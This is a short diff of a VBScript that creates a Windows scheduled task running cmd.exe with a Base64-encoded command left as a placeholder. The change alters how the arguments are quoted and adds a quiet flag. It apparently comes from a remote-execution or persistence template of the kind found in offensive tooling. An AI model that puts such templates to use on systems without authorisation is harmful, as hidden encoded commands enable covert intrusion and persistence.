@@ -26,7 +26,7 @@ Set Action = taskDefinition.Actions.Create(ActionTypeExec)
 Action.Path = "c:\windows\system32\cmd.exe"
 Dim command
 command = Base64StringDecode("REPLACE_WITH_COMMAND")
-Action.arguments = chr(34) & "/c " & command & chr(34)
+Action.arguments = "/Q /c " & command
 Dim objNet, LoginUser
 Set objNet = CreateObject("WScript.Network")
 LoginUser = objNet.UserName
